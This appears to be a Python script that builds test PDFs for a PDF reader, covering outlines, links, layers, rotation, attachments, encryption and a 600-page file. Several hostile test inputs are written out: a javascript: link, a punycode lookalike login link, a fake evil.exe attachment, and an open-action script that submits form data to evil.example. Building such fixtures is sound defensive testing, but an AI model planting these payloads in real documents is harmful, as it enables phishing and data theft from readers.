# Builds the hostile/feature PDFs used by test-reader.py into the current folder. Run from /tmp/w, then run test-reader.py against a local server on :8766 that applies _headers.
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import A4, letter, landscape
import pikepdf
# 1. feature PDF: 6 pages, mixed sizes, text, outline, links
c = canvas.Canvas('feat0.pdf', pagesize=A4)
words = 'Invoice total Dubai reader Measure apple Banana café naïve'.split()
for i in range(6):
    if i == 3: c.setPageSize(landscape(A4))
    if i == 4: c.setPageSize(letter)
    c.setFont('Helvetica', 14)
    c.drawString(72, 760 if i not in (3,) else 520, f'Page {i+1} heading Invoice number {1000+i}')
    for k in range(20): c.drawString(72, 700 - k*24 if i != 3 else 480 - k*20, f'Line {k} of page {i+1}: the quick brown fox {words[k % len(words)]} jumps.')
    c.bookmarkPage(f'p{i+1}'); c.addOutlineEntry(f'Chapter {i+1}', f'p{i+1}', level=0)
    if i == 0:
        c.addOutlineEntry('Section 1.1', 'p2', level=1)
        c.linkURL('https://example.com/safe?x=1', (72, 100, 300, 120), relative=0); c.drawString(72, 105, 'Web link example.com')
        c.linkAbsolute('Go to page 5', 'p5', (320, 100, 520, 120)); c.drawString(320, 105, 'Go to page 5')
        c.linkURL('javascript:alert(1)', (72, 60, 300, 80), relative=0); c.drawString(72, 65, 'Bad javascript link')
        c.linkURL('https://xn--pple-43d.com/login', (320, 60, 520, 80), relative=0); c.drawString(320, 65, 'Lookalike link')
    c.showPage()
c.save()
pdf = pikepdf.open('feat0.pdf')
# page 3 rotated 90
pdf.pages[2].Rotate = 90
# embedded file + file attachment annotation + JS open action + Launch
pdf.attachments['notes.txt'] = pikepdf.AttachedFileSpec(pdf, b'hello attachment', mime_type='text/plain')
pdf.attachments['evil.exe'] = pikepdf.AttachedFileSpec(pdf, b'MZ fake', mime_type='application/octet-stream')
fs = pikepdf.AttachedFileSpec(pdf, b'pinned data', filename='pinned.txt')
annot = pdf.make_indirect(pikepdf.Dictionary(Type=pikepdf.Name.Annot, Subtype=pikepdf.Name.FileAttachment, Rect=[400, 700, 420, 720], FS=fs.obj, Contents=pikepdf.String('pinned')))
pdf.pages[1].obj.Annots = pdf.make_indirect(pikepdf.Array([annot]))
pdf.Root.OpenAction = pdf.make_indirect(pikepdf.Dictionary(S=pikepdf.Name.JavaScript, JS=pikepdf.String('app.alert("pwned"); this.submitForm("https://evil.example/");')))
# optional content: two layers on page 1
ocA = pdf.make_indirect(pikepdf.Dictionary(Type=pikepdf.Name.OCG, Name=pikepdf.String('Prices')))
ocB = pdf.make_indirect(pikepdf.Dictionary(Type=pikepdf.Name.OCG, Name=pikepdf.String('Watermark')))
pdf.Root.OCProperties = pikepdf.Dictionary(OCGs=[ocA, ocB], D=pikepdf.Dictionary(Order=[ocA, ocB], ON=[ocA, ocB]))
p0 = pdf.pages[0]
res = p0.Resources
res.Properties = pikepdf.Dictionary(oc1=ocA, oc2=ocB)
if '/Font' not in res: res.Font = pikepdf.Dictionary()
res.Font.FL = pdf.make_indirect(pikepdf.Dictionary(Type=pikepdf.Name.Font, Subtype=pikepdf.Name.Type1, BaseFont=pikepdf.Name.Helvetica))
extra = b'/OC /oc1 BDC BT /FL 30 Tf 72 300 Td (LAYERPRICE 999) Tj ET EMC /OC /oc2 BDC 1 0 0 rg 200 200 100 60 re f EMC'
p0.contents_add(pdf.make_stream(extra))
pdf.save('feat.pdf')
pdf.save('locked.pdf', encryption=pikepdf.Encryption(user='secret', owner='owner', R=6))
pdf2 = pikepdf.open('feat.pdf'); pdf2.save('noprint.pdf', encryption=pikepdf.Encryption(user='', owner='own', R=6, allow=pikepdf.Permissions(print_lowres=False, print_highres=False)))
# big: 600 pages
c = canvas.Canvas('big600.pdf', pagesize=A4)
for i in range(600): c.drawString(72, 760, f'Big page {i+1} needle{i+1}'); c.showPage()
c.save()
open('fake.pdf','wb').write(b'not a pdf at all')
print('ok')
